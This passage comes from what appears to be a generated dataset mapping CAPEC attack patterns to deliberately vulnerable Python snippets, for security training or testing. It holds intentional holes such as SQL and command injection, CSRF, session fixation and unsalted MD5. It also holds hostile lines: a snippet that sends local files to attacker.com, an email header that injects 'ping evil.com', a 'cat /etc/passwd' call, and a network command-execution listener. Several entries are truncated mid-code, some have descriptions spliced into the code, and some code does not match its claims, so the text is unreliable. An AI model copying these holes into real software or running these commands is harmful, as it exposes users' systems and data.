        "code_snippet": "class VulnerableProxy:\n    def forward_request(self, request):\n        # Vulnerable HTTP proxy implementation\n        headers = request.headers\n        content_length = headers.get('Content-Length', '0')\n        transfer_encoding = headers.get('Transfer-Encoding', '')\n        \n        # Inconsistent handling of Content-Length and Transfer-Encoding\n        if transfer_encoding.lower() == 'chunked':\n            # Process chunked data incorrectly\n            body = request.body\n        else:\n            # Use Content-Length without proper validation\n            body = request.body[:int(content_length)]\n        \n        # Vulnerable CRLF injection point\n        custom_header = headers.get('X-Custom-Header', '')\n        forwarded_headers = f'X-Forwarded-For: {request.remote_addr}\\r\\n'\n        forwarded_headers += f'X-Custom-Header: {custom_header}\\r\\n'\n        \n        # SSRF vulnerability - no URL validation\n        target_url = request.args.get('url', 'http://internal-server')\n        \n        # Forward request without proper source verification\n        response = requests.post(\n            target_url,\n            headers=forwarded_headers,\n            data=body,\n            verify=False\n        )\n        \n        return response.content",
        "description": "This code represents a vulnerable HTTP proxy implementation that demonstrates multiple security issues including HTTP Request Smuggling through inconsistent interpretation of Content-Length and Transfer-Encoding headers, CRLF injection in header handling, SSRF through unvalidated URL forwarding, and acting as a confused deputy by not properly preserving request origins."
    },
    {
        "capec_id": "34",
        "capec_name": "HTTP Response Splitting",
        "code_snippet": "def handle_http_response(server_response):\n    # Vulnerable code that doesn't properly sanitize HTTP response headers\n    user_provided_content = get_user_content()\n    \n    # Incorrectly combining headers without proper sanitization\n    modified_headers = f\"Content-Length: {len(user_provided_content)}\\r\\n\"\n    modified_headers += f\"Content-Type: text/html\\r\\n\"\n    modified_headers += f\"Set-Cookie: session={user_provided_content}\\r\\n\\r\\n\"\n    \n    # Vulnerable concatenation allowing response splitting\n    final_response = modified_headers + server_response\n    \n    # Send response without proper validation\n    send_response(final_response)\n\ndef get_user_content():\n    return input(\"Enter content: \")\n\ndef send_response(response):\n    # Simulated response sending\n    pass",
        "description": "This code demonstrates HTTP response splitting vulnerability by improperly handling user input in HTTP response headers. It allows an attacker to inject malicious content including CRLF sequences (\\r\\n) that can split the response into multiple responses. The code fails to sanitize user input before including it in headers, enabling response smuggling and potentially leading to cache poisoning or XSS attacks."
    },
    {
        "capec_id": "35",
        "capec_name": "Leverage Executable Code in Non-Executable Files",
        "code_snippet": "\"\"\"\nimport os\nimport json\nimport shutil\nfrom pathlib import Path\n\ndef load_config_and_execute(config_path):\n    with open(config_path, 'r') as f:\n        config = json.load(f)\n    \n    # Vulnerable: Directly executing commands from config\n    if 'startup_command' in config:\n        os.system(config['startup_command'])\n    \n    # Vulnerable: Loading and executing external scripts\n    if 'script_path' in config:\n        with open(config['script_path'], 'r') as script_file:\n            script_content = script_file.read()\n            exec(script_content)\n    \n    # Vulnerable: Following symlinks without verification\n    if 'resource_path' in config:\n        resource = Path(config['resource_path'])\n        shutil.copy2(resource, '/app/resources/')\n        \n    # Vulnerable: Template processing with no sanitization\n    if 'template' in config:\n        template = config['template']\n        template_vars = config.get('vars', {",
        "description": "\"This code demonstrates multiple vulnerabilities related to unsafe handling of configuration files and resources. It includes unsafe execution of commands from config files, direct execution of external scripts using exec(), unsafe symlink following, and dangerous template processing using eval(). The code lacks proper input validation, privilege management, and resource access controls.\""
    },
    {
        "capec_id": "36",
        "capec_name": "Using Unpublished Interfaces or Functionality",
        "code_snippet": "class AdminSystem:\n    def __init__(self):\n        self.debug_mode = False\n        self._admin_functions = {\n            'DEBUG_CMD': self._toggle_debug,\n            'EXEC_CMD': self._execute_command,\n            'GET_LOGS': self._get_system_logs\n        }\n    \n    def handle_request(self, command, params):\n        if command in self._admin_functions:\n            return self._admin_functions[command](params)\n    \n    def _toggle_debug(self, value):\n        self.debug_mode = value\n        return {'status': 'debug mode changed'}\n    \n    def _execute_command(self, cmd):\n        import os\n        return {'output': os.popen(cmd).read()}\n    \n    def _get_system_logs(self, path):\n        with open(path, 'r') as f:\n            return {'logs': f.read()}\n\nsystem = AdminSystem()\nresult = system.handle_request('EXEC_CMD', 'cat /etc/passwd')",
        "description": "This vulnerable code implements an administrative system with undocumented, low-level functionality that lacks authentication and authorization checks. The system exposes dangerous operations like command execution and file reading through a simple interface that doesn't validate user identity or permissions. Any user who discovers these interfaces can access critical system functions and resources."
    },
    {
        "capec_id": "37",
        "capec_name": "Retrieve Embedded Sensitive Data",
        "code_snippet": "class UserSession:\n    def __init__(self):\n        self.credit_card = '4532-7153-3790-8521'\n        self.ssn = '123-45-6789'\n        self.api_key = 'sk_live_abc123xyz789'\n\n    def logout(self):\n        # Improper cleanup of sensitive data\n        self.credit_card = None\n        self.ssn = None\n        self.api_key = None\n        # Memory still contains the original values\n\ndef process_payment(user):\n    # Store sensitive data in temporary file without encryption\n    with open('temp_payment.txt', 'w') as f:\n        f.write(f'CC: {user.credit_card}\\n')\n        f.write(f'SSN: {user.ssn}\\n')\n        f.write(f'KEY: {user.api_key}\\n')\n    \n    # Process payment...\n    \n    # Delete file but data remains on disk\n    import os\n    os.remove('temp_payment.txt')",
        "description": "This vulnerable code demonstrates several issues with handling sensitive data: storing sensitive information in cleartext, improper cleanup of memory containing sensitive data, and inadequate removal of sensitive data from storage. The code stores credit card numbers, SSNs, and API keys in memory without encryption and writes them to a temporary file in cleartext. When cleaning up, it fails to properly zeroize the memory and merely deletes the file reference without secure wiping, leaving sensitive data potentially recoverable."
    },
    {
        "capec_id": "38",
        "capec_name": "Leveraging/Manipulating Configuration File Search Paths",
        "code_snippet": "import os\nimport subprocess\n\ndef run_java_app(user_classpath):\n    # User-controlled classpath directly concatenated\n    os.environ['CLASSPATH'] = os.environ.get('CLASSPATH', '') + ':' + user_classpath\n    \n    # Configuration with hardcoded credentials and paths\n    config = {\n        'db_user': 'admin',\n        'db_password': 'password123',\n        'lib_path': user_classpath + '/lib'\n    }\n    \n    # Execute Java application with untrusted classpath\n    subprocess.call(['java', '-cp', os.environ['CLASSPATH'], 'com.example.App'])\n    \n    # Load library from user-controlled path\n    lib_name = input('Enter library name: ')\n    lib_path = os.path.join(config['lib_path'], lib_name)\n    os.system(f'java -Djava.library.path={lib_path} -jar app.jar')",
        "description": "This vulnerable code allows an attacker to manipulate the Java classpath and library loading paths. It combines uncontrolled search paths, external control of file paths, and plaintext credentials in configuration. An attacker could exploit this by injecting malicious JAR files or native libraries into the classpath or library path."
    },
    {
        "capec_id": "39",
        "capec_name": "Manipulating Opaque Client-based Data Tokens",
        "code_snippet": "\"\"\"\nfrom flask import Flask, request, make_response\nimport json\n\napp = Flask(__name__)\n\nclass UserWallet:\n    def __init__(self):\n        self.balance = 1000\n\n@app.route('/process_payment', methods=['POST'])\ndef process_payment():\n    # Get wallet cookie without validation\n    wallet_data = request.cookies.get('wallet_info')\n    \n    if wallet_data:\n        # Directly use client-provided data without verification\n        wallet = json.loads(wallet_data)\n        amount = float(request.form['amount'])\n        \n        # No integrity check on wallet data\n        if wallet['balance'] >= amount:\n            wallet['balance'] -= amount\n            \n            # Store sensitive data in cleartext cookie\n            response = make_response({'status': 'success'",
        "description": "\"This code demonstrates vulnerable handling of client-side data in cookies, specifically a wallet system that stores sensitive financial information. The code lacks proper validation, integrity checks, and stores sensitive data in cleartext cookies. It assumes cookie data is immutable and trustworthy, allowing manipulation of wallet balance. The implementation also lacks proper authentication and authorization checks, making it susceptible to session fixation and parameter manipulation attacks.\""
    },
    {
        "capec_id": "40",
        "capec_name": "Manipulating Writeable Terminal Devices",
        "code_snippet": "\"\"\"\nimport os\nimport socket\n\ndef terminal_listener():\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.bind(('0.0.0.0', 4444))\n    sock.listen(1)\n    \n    while True:\n        conn, addr = sock.accept()\n        data = conn.recv(1024).decode()\n        \n        # Vulnerable: directly executing received commands\n        os.system(data)\n        \n        # Vulnerable: writing results to world-readable file\n        with open('/tmp/output.txt', 'w') as f:\n            result = os.popen(data).read()\n            f.write(result)\n            os.chmod('/tmp/output.txt', 0o666)\n\nif __name__ == '__main__':\n    terminal_listener()\n\"\"\",\n    \"description\": \"A vulnerable terminal listener that accepts and executes commands from network connections without sanitization, stores output in world-readable files, and exposes sensitive command execution to other processes. The code demonstrates command injection vulnerabilities, improper process control, and exposure of sensitive information through world-readable files.\"",
        "description": "\"A vulnerable terminal listener that accepts and executes commands from network connections without sanitization, stores output in world-readable files, and exposes sensitive command execution to other processes. The code demonstrates command injection vulnerabilities, improper process control, and exposure of sensitive information through world-readable files.\""
    },
    {
        "capec_id": "41",
        "capec_name": "Using Meta-characters in E-mail Headers to Inject Malicious Payloads",
        "code_snippet": "def send_malicious_email(recipient, subject, body):\n    headers = {\n        'To': recipient,\n        'From': 'admin@legitimate-domain.com',\n        'Subject': subject + '\\r\\n\\r\\nBcc: malicious@attacker.com',\n        'Content-Type': 'text/html; charset=\"UTF-8\"\\r\\n\\r\\n<script>malicious_code()</script>',\n        'X-Custom-Header': '\\\" & calc.exe & ping evil.com & \\\"'\n    }\n    \n    email_content = ''\n    for key, value in headers.items():\n        if not isinstance(value, str):\n            value = str(value)\n        email_content += f'{key}: {value}\\n'\n    \n    email_content += f'\\n{body}'\n    \n    with open('outgoing_mail.txt', 'w') as mail:\n        mail.write(email_content)\n    \n    return send_smtp(email_content)",
        "description": "This vulnerable code demonstrates email header injection by failing to properly sanitize meta-characters and special sequences in email headers. It allows injection of additional headers, script content, and command execution through header manipulation. The code incorrectly handles header boundaries, enables HTML/script injection through content-type headers, and doesn't properly escape special characters, making it susceptible to email header manipulation attacks."
    },
    {
        "capec_id": "42",
        "capec_name": "MIME Conversion",
        "code_snippet": "def convert_to_mime(email_content, attachments):\n    mime_msg = []\n    buffer = bytearray(1024)  # Fixed size buffer\n\n    for attachment in attachments:\n        filename = attachment['name']\n        content = attachment['data']\n        \n        # Vulnerable MIME conversion\n        mime_header = f'Content-Type: {get_content_type(filename)}\\n'\n        mime_header += f'Content-Disposition: attachment; filename={filename}\\n'\n        \n        # Buffer overflow vulnerability - no size checking\n        buffer[0:] = mime_header.encode()\n        buffer[len(mime_header):] = content  # No bounds checking\n        \n        # Process MIME content without validation\n        processed_content = process_mime_content(buffer)\n        mime_msg.append(processed_content)\n    \n    return ''.join(mime_msg)\n\ndef get_content_type(filename):\n    # Relies solely on file extension without proper validation\n    ext = filename.split('.')[-1].lower()\n    return f'application/{ext}'",
        "description": "This vulnerable code demonstrates a MIME conversion routine with multiple security issues: it uses a fixed-size buffer without checking input sizes, performs unsafe MIME header construction using unvalidated input, and relies solely on file extensions for content type determination. It's susceptible to buffer overflows through oversized attachments and MIME headers, and can be exploited through maliciously crafted filenames and content types."
    },
    {
        "capec_id": "43",
        "capec_name": "Exploiting Multiple Input Interpretation Layers",
        "code_snippet": "def process_command(user_input):\n    # First parser: Basic URL decoding\n    decoded_input = urllib.parse.unquote(user_input)\n    \n    # Input validation - checks for dangerous characters\n    if any(char in decoded_input for char in ['&', '|', ';', '>', '<']):\n        return 'Invalid input'\n    \n    # Second parser: Convert HTML entities\n    processed_input = html.unescape(decoded_input)\n    \n    # Execute the command without proper validation after second parsing\n    os.system(f'echo {processed_input}')",
        "description": "This vulnerable code demonstrates incorrect behavior order in input validation. It performs URL decoding, then validates for dangerous characters, but then processes HTML entities which could potentially reveal malicious characters that were encoded. For example, an input like '%26amp%3B' would pass the validation but ultimately be converted to '&', allowing command injection."
    },
    {
        "capec_id": "44",
        "capec_name": "Overflow Binary Resource File",
        "code_snippet": "def process_image_file(filename):\n    buffer = bytearray(1024)\n    try:\n        with open(filename, 'rb') as f:\n            # Vulnerable: No size checking before copy\n            data = f.read()\n            for i in range(len(data)):\n                buffer[i] = data[i]  # Potential buffer overflow\n\n            if filename.endswith('.jpg') or filename.endswith('.jpeg'):\n                # Vulnerable: Relying only on extension\n                process_as_jpeg(buffer)\n            elif filename.endswith('.png'):\n                process_as_png(buffer)\n    except Exception as e:\n        pass\n\ndef process_as_jpeg(buffer):\n    # Simulate processing JPEG data\n    header = buffer[0:2]\n    if header == b'\\xff\\xd8':  # JPEG magic number\n        # Vulnerable: No bounds checking\n        content_size = int.from_bytes(buffer[2:4], 'big')\n        process_content(buffer[4:4+content_size])",
        "description": "This vulnerable code demonstrates multiple security issues including classic buffer overflow (CWE-120) when copying file data into a fixed buffer without size checking, improper memory bounds checking (CWE-119), and reliance on file extensions for processing (CWE-646). The code attempts to process binary image files but fails to implement proper validation and boundary checks, making it susceptible to buffer overflow attacks through maliciously crafted image files."
    },
    {
        "capec_id": "45",
        "capec_name": "Buffer Overflow via Symbolic Links",
        "code_snippet": "def process_symlink_data(symlink_path):\n    # Buffer to store the content of the symlink\n    buffer = bytearray(64)\n    \n    # Read symlink without checking the actual content length\n    with open(symlink_path, 'rb') as f:\n        content = f.read()\n        # Vulnerable: no size check before copy\n        for i in range(len(content)):\n            buffer[i] = content[i]  # Potential buffer overflow\n    \n    # Process the symlink content without proper validation\n    if os.path.islink(symlink_path):\n        target = os.readlink(symlink_path)\n        # Vulnerable: no validation of symlink target\n        return process_file(target)\n    return buffer",
        "description": "This code demonstrates a vulnerable implementation of symlink processing that can lead to buffer overflow. The code fails to verify the size of input data before copying it into a fixed-size buffer and doesn't properly validate symlink targets. It combines multiple vulnerabilities including buffer overflow (CWE-120), improper input validation (CWE-20), and improper restriction of memory buffer operations (CWE-119)."
    },
    {
        "capec_id": "46",
        "capec_name": "Overflow Variables and Tags",
        "code_snippet": "\"\"\"\ndef parse_config_file(file_path):\n    buffer = bytearray(64)\n    with open(file_path, 'rb') as f:\n        config_data = f.read()\n        \n    # Vulnerable: No size checking before copy\n    for i in range(len(config_data)):\n        buffer[i] = config_data[i]  # Potential buffer overflow\n        \n    # Process HTML-like tags from config\n    tag_start = 0\n    while True:\n        tag_start = config_data.find(b'<', tag_start)\n        if tag_start == -1:\n            break\n        tag_end = config_data.find(b'>', tag_start)\n        if tag_end == -1:\n            break\n            \n        # Extract and process tag without validation\n        tag_content = buffer[tag_start:tag_end+1]\n        process_tag(tag_content)  # Potential overflow in downstream processing\n        tag_start = tag_end + 1\n\ndef process_tag(tag_data):\n    # Vulnerable: No input validation\n    tag_buffer = bytearray(32)\n    tag_buffer[:len(tag_data)] = tag_data  # Potential buffer overflow\n    return tag_buffer\"\"\",\n    \"description\": \"This code demonstrates a vulnerable configuration file parser that processes HTML-like tags. It contains multiple buffer overflow vulnerabilities due to lack of input size validation, improper buffer boundary checking, and unsafe buffer copies. The code allocates fixed-size buffers but fails to verify input lengths before copying data, making it susceptible to buffer overflows through specially crafted configuration files with oversized tags or malformed HTML content.\"",
        "description": "\"This code demonstrates a vulnerable configuration file parser that processes HTML-like tags. It contains multiple buffer overflow vulnerabilities due to lack of input size validation, improper buffer boundary checking, and unsafe buffer copies. The code allocates fixed-size buffers but fails to verify input lengths before copying data, making it susceptible to buffer overflows through specially crafted configuration files with oversized tags or malformed HTML content.\""
    },
    {
        "capec_id": "47",
        "capec_name": "Buffer Overflow via Parameter Expansion",
        "code_snippet": "def process_data(input_data):\n    buffer = bytearray(64)  # Fixed size buffer\n    expanded_data = input_data.replace('A', 'AAAAA')  # Input expansion\n    \n    # Vulnerable copy without size check\n    for i in range(len(expanded_data)):\n        buffer[i] = ord(expanded_data[i])\n    \n    return buffer",
        "description": "This code demonstrates a vulnerable data expansion scenario where input containing 'A' characters is expanded 5x in size during processing. The code uses a fixed-size buffer (64 bytes) and attempts to copy the expanded data without checking if it exceeds the buffer's boundaries, potentially causing a buffer overflow when the expanded input is larger than 64 bytes."
    },
    {
        "capec_id": "48",
        "capec_name": "Passing Local Filenames to Functions That Expect a URL",
        "code_snippet": "from flask import Flask, request, render_template\nimport os\n\napp = Flask(__name__)\n\n@app.route('/file_access')\ndef access_file():\n    file_path = request.args.get('path', '')\n    if file_path.startswith('http'):\n        return 'Remote files not supported'\n    \n    try:\n        with open(file_path, 'r') as f:\n            content = f.read()\n            # Send file contents to external server\n            requests.post('http://attacker.com/collect', data={'content': content})\n        return render_template('viewer.html', content=content)\n    except:\n        return 'Error reading file'\n\napp.run(host='0.0.0.0', port=5000)",
        "description": "This vulnerable code demonstrates a local file inclusion vulnerability where user input is not properly validated before accessing local files. The code accepts a file path parameter via GET request, attempts to read the specified local file, and sends its contents to an external server. It fails to properly validate file paths, doesn't check file types, and exposes sensitive local data through insecure transmission."
    },
    {
        "capec_id": "49",
        "capec_name": "Password Brute Forcing",
        "code_snippet": "def login_system():\n    attempts = 0\n    users = {'admin': 'password123'}\n    stored_passwords = {}\n\n    def register(username, password):\n        # Store password in plain text\n        users[username] = password\n        stored_passwords[username] = password\n\n    def authenticate(username, password):\n        nonlocal attempts\n        # No limit on login attempts\n        while True:\n            if username in users and users[username] == password:\n                return True\n            attempts += 1\n            return False\n\n    def reset_password(username, new_password):\n        # No password complexity requirements\n        # No password history check\n        users[username] = new_password\n\n    # Example usage with weak password policy\n    register('user1', '123')\n    for possible_password in range(1000):\n        if authenticate('user1', str(possible_password)):\n            print(f'Password found: {possible_password}')",
        "description": "This vulnerable code demonstrates multiple authentication weaknesses: unlimited login attempts allowing brute force attacks, weak password storage in plaintext, no password complexity requirements, single-factor authentication, and no protection against password guessing. The system stores passwords in a recoverable format and lacks password aging mechanisms."
    },
    {
        "capec_id": "50",
        "capec_name": "Password Recovery Exploitation",
        "code_snippet": "class PasswordRecovery:\n    def __init__(self):\n        self.passwords = {\n            'user@email.com': {\n                'password': 'mypass123',  # stored in plain text\n                'security_question': 'What is your pet name?',\n                'security_answer': 'fluffy'\n            }\n        }\n    \n    def recover_password(self, email, security_answer):\n        if email in self.passwords:\n            if security_answer.lower() == self.passwords[email]['security_answer']:\n                # Send password in plain text via email\n                password = self.passwords[email]['password']\n                self.send_password_email(email, password)\n                return True\n        return False\n    \n    def send_password_email(self, email, password):\n        # Simulating sending email with plain text password\n        email_body = f'Your password is: {password}'\n        # send_email(email, email_body)  # Not implemented\n        \n    def reset_password(self, email, new_password):\n        if email in self.passwords:\n            # No password complexity requirements\n            self.passwords[email]['password'] = new_password\n            return True\n        return False",
        "description": "This vulnerable code implements a weak password recovery system that stores passwords in plain text, uses simple security questions for authentication, sends passwords via email in clear text, and lacks password complexity requirements. It demonstrates multiple security issues including insufficient credential protection, weak recovery mechanisms, and poor password storage practices."
    },
    {
        "capec_id": "51",
        "capec_name": "Poison Web Service Registry",
        "code_snippet": "\"\"\"\nimport requests\nfrom xml.etree import ElementTree\nimport winreg\n\nclass ServiceRegistry:\n    def __init__(self):\n        self.registry_key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, 'SOFTWARE\\\\WebServices')\n        \n    def register_service(self, service_name, wsdl_url, api_key):\n        # Store service info in registry without encryption\n        winreg.SetValueEx(self.registry_key, service_name, 0, winreg.REG_SZ, wsdl_url)\n        winreg.SetValueEx(self.registry_key, f\"{service_name",
        "description": "\"This vulnerable code implements a service registry that stores service information in the Windows Registry. It contains multiple security issues: storing sensitive data (API keys) in cleartext, lack of authorization checks, potential XML injection through unvalidated WSDL parsing, exposure of sensitive WSDL information, and no input validation for metadata updates. The registry could be poisoned to redirect service requests to malicious endpoints.\""
    },
    {
        "capec_id": "52",
        "capec_name": "Embedding NULL Bytes",
        "code_snippet": "def process_and_store_filename(user_filename):\n    # Vulnerable code that doesn't properly check for null bytes\n    if '..' not in user_filename:\n        # Attempt to store filename in database\n        file_path = '/var/www/uploads/' + user_filename\n        with open(file_path, 'wb') as f:\n            f.write(b'file content')\n        \n        # Vulnerable database query that doesn't properly handle null bytes\n        db_query = f\"INSERT INTO files (filename) VALUES ('{user_filename}')\"\n        execute_query(db_query)\n    \n    return True\n\n# Example exploitation\nmalicious_filename = 'malicious.php\\x00.txt'",
        "description": "This code is vulnerable to null byte injection attacks by not properly validating or sanitizing input containing null bytes. An attacker can bypass file extension checks by appending a null byte followed by a safe extension, potentially allowing upload of dangerous files. The database query is also vulnerable as the null byte can truncate the query string, leading to unexpected behavior. The code violates multiple security principles by failing to properly validate input, handle special characters, and neutralize dangerous elements before processing."
    },
    {
        "capec_id": "53",
        "capec_name": "Postfix, Null Terminate, and Backslash",
        "code_snippet": "def process_file_path(user_input):\n    # Vulnerable function that checks for valid file paths\n    # Assumes paths must end with a slash\n    if not user_input.endswith('/'):\n        return 'Invalid path'\n    \n    # Vulnerable string handling that doesn't properly check for null bytes\n    file_path = user_input.encode('utf-8')\n    \n    # Attacker can inject: 'malicious\\x00path/'\n    # The null byte truncates the string when passed to system calls\n    with open(file_path, 'r') as f:\n        return f.read()",
        "description": "This code is vulnerable to null byte injection due to improper validation of file paths. An attacker can bypass the slash requirement by adding it after a null byte. The code fails to properly handle alternate encodings and null characters, allowing access to unintended files when the path is processed by system calls."
    },
    {
        "capec_id": "54",
        "capec_name": "Query System for Information",
        "code_snippet": "from flask import Flask, request\nimport sqlite3\n\napp = Flask(__name__)\n\n@app.route('/user_info', methods=['GET'])\ndef get_user_info():\n    try:\n        user_id = request.args.get('id')\n        conn = sqlite3.connect('users.db')\n        cursor = conn.cursor()\n        query = f\"SELECT * FROM users WHERE id = {user_id}\"\n        cursor.execute(query)\n        result = cursor.fetchone()\n        return {'user': result}\n    except Exception as e:\n        return {'error': str(e), 'stack_trace': str(e.__traceback__),\n                'db_details': conn.get_backend_pid()}\n\n@app.route('/search_transactions')\ndef search_transactions():\n    amount = request.args.get('amount')\n    user_id = request.args.get('user_id')\n    query = f\"SELECT * FROM transactions WHERE user_id='{user_id}' AND amount>{amount}\"\n    conn = sqlite3.connect('transactions.db')\n    cursor = conn.cursor()\n    return {'transactions': cursor.execute(query).fetchall()}",
        "description": "This vulnerable code demonstrates several security issues: SQL injection through unvalidated user input, exposure of sensitive information in error messages, use of GET method with sensitive parameters, and improper query construction. The error handler reveals detailed system information, and the queries are constructed using string formatting without proper parameterization."
    },
    {
        "capec_id": "55",
        "capec_name": "Rainbow Table Password Cracking",
        "code_snippet": "import hashlib\n\ndef create_user(username, password):\n    # Simple MD5 hash - weak hashing algorithm\n    hash_object = hashlib.md5(password.encode())\n    password_hash = hash_object.hexdigest()\n    \n    # Store username and hash in database without salt\n    db_query = f\"INSERT INTO users (username, password_hash) VALUES ('{username}', '{password_hash}')\"\n    \n    # No password complexity requirements\n    # No password expiration\n    # Single factor authentication only\n    return True\n\ndef authenticate(username, password):\n    # Get stored hash from database\n    stored_hash = \"SELECT password_hash FROM users WHERE username = '\" + username + \"'\"\n    \n    # Compare using simple MD5 hash\n    hash_object = hashlib.md5(password.encode())\n    if hash_object.hexdigest() == stored_hash:\n        return True\n    return False",
        "description": "This vulnerable code demonstrates weak password storage and authentication using MD5 hashing without salt, making it susceptible to rainbow table attacks. It lacks password complexity requirements, password aging mechanisms, and relies on single-factor authentication. The use of MD5, a cryptographically broken hash function, with no computational effort considerations makes password cracking trivial."
    },
    {
        "capec_id": "56",
        "capec_name": "DEPRECATED: Removing/short-circuiting 'guard logic'",
        "code_snippet": "class AuthenticationManager:\n    def __init__(self):\n        self.session_tokens = {}\n\n    def authenticate(self, user_token):\n        # Client-side validation only\n        if self._client_validate_token(user_token):\n            return True\n        return False\n\n    def _client_validate_token(self, token):\n        # Vulnerable: No server-side validation, relies purely on client\n        # Token validation can be bypassed by modifying client code\n        import hashlib\n        hash_value = hashlib.md5(token.encode()).hexdigest()\n        return hash_value in self.session_tokens\n\n    def generate_token(self, username):\n        import random\n        token = str(random.randint(1000, 9999))\n        self.session_tokens[token] = username\n        return token",
        "description": "This vulnerable code demonstrates client-side enforcement of server-side security (CWE-602) where authentication logic is implemented on the client side and can be easily bypassed. The code also illustrates capture-replay vulnerability (CWE-294) as tokens can be captured and replayed. The authentication mechanism relies solely on client-side validation, making it trivial to bypass security controls by modifying the client code or replaying captured tokens."
    },
    {
        "capec_id": "57",
        "capec_name": "Utilizing REST's Trust in the System Resource to Obtain Sensitive Data",
        "code_snippet": "\"\"\"\nimport requests\nimport json\n\nclass InsecureRESTAPI:\n    def __init__(self):\n        self.api_endpoint = 'http://api.example.com'  # Non-HTTPS endpoint\n        self.session_tokens = {",
        "description": "\"This code demonstrates multiple security vulnerabilities in a REST API implementation including: use of non-HTTPS endpoints, sending sensitive data via GET requests, improper authentication verification, storing sensitive data in publicly accessible locations, and lack of proper channel security. The code allows for unauthorized access and manipulation of sensitive data through various attack vectors.\""
    },
    {
        "capec_id": "58",
        "capec_name": "Restful Privilege Elevation",
        "code_snippet": "\"\"\"\nfrom flask import Flask, jsonify, request\n\napp = Flask(__name__)\n\nuser_data = {\n    'user1': {'balance': 1000, 'role': 'user'",
        "description": "\"This vulnerable Flask application exposes a REST API endpoint that handles user balance operations without proper authentication or authorization. It allows any user to view, modify, or delete any user's balance regardless of their privileges. The endpoint accepts GET, PUT, and DELETE methods without checking the requester's identity or permissions, and assumes HTTP GET requests are safe. This violates proper privilege management and authorization principles, allowing unauthorized access and modifications to sensitive data.\""
    },
    {
        "capec_id": "59",
        "capec_name": "Session Credential Falsification through Prediction",
        "code_snippet": "import random\nimport time\n\nclass SessionManager:\n    def __init__(self):\n        self.sessions = {}\n        self.counter = 0\n\n    def generate_session_id(self):\n        # Vulnerable session ID generation using predictable values\n        self.counter += 1\n        timestamp = int(time.time())\n        session_id = f'{timestamp}{self.counter}'\n        return session_id\n\n    def create_session(self, user_id):\n        session_id = self.generate_session_id()\n        self.sessions[session_id] = {\n            'user_id': user_id,\n            'created_at': time.time(),\n            'authenticated': True\n        }\n        return session_id\n\n    def validate_session(self, session_id):\n        return session_id in self.sessions",
        "description": "This code demonstrates a vulnerable session management implementation where session IDs are generated using predictable values (timestamp and counter). The sequential nature of the session IDs makes them easily guessable, allowing attackers to predict valid session IDs and hijack user sessions. The code lacks proper entropy in session ID generation, doesn't validate session origins, and fails to implement proper session invalidation mechanisms."
    },
    {
        "capec_id": "60",
        "capec_name": "Reusing Session IDs (aka Session Replay)",
        "code_snippet": "from flask import Flask, session, request\nimport uuid\n\napp = Flask(__name__)\napp.secret_key = 'secret_key_123'\n\n# Store active sessions in memory\nactive_sessions = {}\n\n@app.route('/login', methods=['POST'])\ndef login():\n    username = request.form['username']\n    password = request.form['password']\n    \n    if username == 'admin' and password == 'password':\n        # Generate session ID without proper entropy\n        session_id = str(uuid.uuid4())[-12:]\n        # No session invalidation\n        session['id'] = session_id\n        # Store session without expiration\n        active_sessions[session_id] = username\n        \n        # Set persistent cookie with sensitive data\n        response = app.make_response('Login successful')\n        response.set_cookie('session_id', session_id, max_age=365*24*60*60)\n        return response\n    \n    return 'Login failed'\n\n@app.route('/check_auth')\ndef check_auth():\n    session_id = request.cookies.get('session_id')\n    # No validation of session origin or freshness\n    if session_id in active_sessions:\n        return f'Authenticated as: {active_sessions[session_id]}'\n    return 'Not authenticated'",
        "description": "This vulnerable code demonstrates session management flaws including session replay vulnerability, session fixation, and improper session validation. It uses persistent cookies containing sensitive information, lacks proper session invalidation, and performs inadequate session ID generation. The code also fails to properly validate the origin of session data and doesn't implement proper session expiration or cleanup."
    },
    {
        "capec_id": "61",
        "capec_name": "Session Fixation",
        "code_snippet": "class AuthenticationServer:\n    def __init__(self):\n        self.sessions = {}\n\n    def login(self, username, password, session_id=None):\n        # Vulnerable: Accepts client-provided session ID\n        if session_id is None:\n            session_id = generate_random_session_id()\n        \n        if authenticate(username, password):\n            # Vulnerable: Does not invalidate existing session\n            self.sessions[session_id] = {\n                'username': username,\n                'authenticated': True,\n                'privileges': 'admin' if username == 'admin' else 'user'\n            }\n            return session_id\n        return None\n\n    def check_auth(self, session_id):\n        # Vulnerable: No session expiration or validation\n        if session_id in self.sessions:\n            return self.sessions[session_id]\n        return None\n\n# Example usage showing vulnerability\ndef client_code():\n    server = AuthenticationServer()\n    attacker_session = 'hijacked_session_123'\n    \n    # Attacker provides known session ID\n    victim_session = server.login('victim', 'password123', attacker_session)\n    \n    # Attacker can now use the authenticated session\n    privileged_session = server.check_auth(attacker_session)",
        "description": "This vulnerable code demonstrates session fixation by allowing client-provided session IDs during authentication, failing to invalidate existing sessions, and lacking proper session management controls. The server accepts arbitrary session identifiers, maintains them across privilege changes, and implements insufficient session validation, making it susceptible to session hijacking attacks."
    },
    {
        "capec_id": "62",
        "capec_name": "Cross Site Request Forgery",
        "code_snippet": "from flask import Flask, request, make_response\n\napp = Flask(__name__)\n\n@app.route('/transfer_money', methods=['POST'])\ndef transfer_money():\n    # No CSRF token validation\n    # No authentication check for critical function\n    amount = request.form.get('amount')\n    destination = request.form.get('destination')\n    \n    # Process the transfer without verification\n    process_transfer(amount, destination)\n    \n    # Set cookie without SameSite attribute\n    resp = make_response('Transfer successful')\n    resp.set_cookie('session_id', 'user123', secure=False, httponly=False)\n    \n    return resp\n\n@app.route('/create_form')\ndef create_form():\n    # Vulnerable form without CSRF token\n    form = '''\n    <form action=\"/transfer_money\" method=\"POST\">\n        <input type=\"hidden\" name=\"destination\" value=\"attacker_account\">\n        <input type=\"hidden\" name=\"amount\" value=\"1000\">\n        <input type=\"submit\" value=\"Click here!\">\n    </form>\n    '''    \n    return form",
        "description": "This code demonstrates a vulnerable banking application that processes money transfers without proper CSRF protection, authentication, or secure cookie handling. The application accepts transfer requests without validating the origin or user intent, sets insecure cookies without SameSite attributes, and lacks proper authentication checks for critical financial operations. An attacker could craft a malicious link containing a form that automatically submits to the transfer endpoint, exploiting an authenticated user's session."
    },
    {
        "capec_id": "63",
        "capec_name": "Cross-Site Scripting (XSS)",
        "code_snippet": "\"\"\"\ndef render_user_comment(user_input):\n    # Store user comment directly in HTML without sanitization\n    comment_html = f'''\n        <div class='comment'>\n            <img src='{user_input",
        "description": "\"Vulnerable code that fails to properly sanitize user input before embedding it into HTML output, allowing XSS attacks through IMG tag attributes and error messages. Uses an incomplete blacklist approach that can be bypassed with XSS variants.\""
    },
    {
        "capec_id": "64",
